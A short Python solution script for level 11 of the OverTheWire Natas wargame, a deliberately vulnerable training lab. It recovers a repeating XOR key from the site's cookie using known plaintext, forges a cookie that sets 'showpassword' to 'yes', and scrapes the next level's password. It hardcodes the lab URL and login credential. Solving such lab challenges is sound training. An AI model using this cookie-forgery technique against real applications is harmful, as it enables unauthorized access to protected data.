import requests
import re
import base64

def flag(url,username,password,session,cookie_key,cookie_value):
    url_decode = cookie_value[0].replace("%3D","=")
    key = base64.b64decode(url_decode)
    key = key.decode('utf-8')
    data = '{"showpassword":"no","bgcolor":"#ffffff"}'
    xor = ""
    for i in range(0,len(data)):
        xor += chr(ord(data[i]) ^ ord(key[i%len(key)]))
    og_key = xor[0:4]
    new_data = '{"showpassword":"yes","bgcolor":"#ffffff"}'
    xor = ""
    for i in range(0,len(new_data)):
        xor += chr(ord(new_data[i]) ^ ord(og_key[i%len(og_key)]))
    final_cookie = base64.b64encode(xor.encode()).decode('utf-8')
    headers = {
            "Cookie":cookie_key[0] + "=" + final_cookie.strip()
            }
    flag_site = session.get(url,auth=(username,password),headers=headers)
    flag = re.findall("password for natas12 is(.*)<br>",flag_site.text)
    print("The flag for natas11 is: " + flag[0].strip())

def login(url,username,password):
    session = requests.Session()
    site = session.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    cookie_dict = session.cookies.get_dict()
    cookie_key = list(cookie_dict.keys())
    cookie_value = list(cookie_dict.values())
    flag(url,username,password,session,cookie_key,cookie_value) 

if __name__=="__main__":
    url = "http://natas11.natas.labs.overthewire.org/"
    username = "natas11"
    password = "1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg"
    login(url,username,password)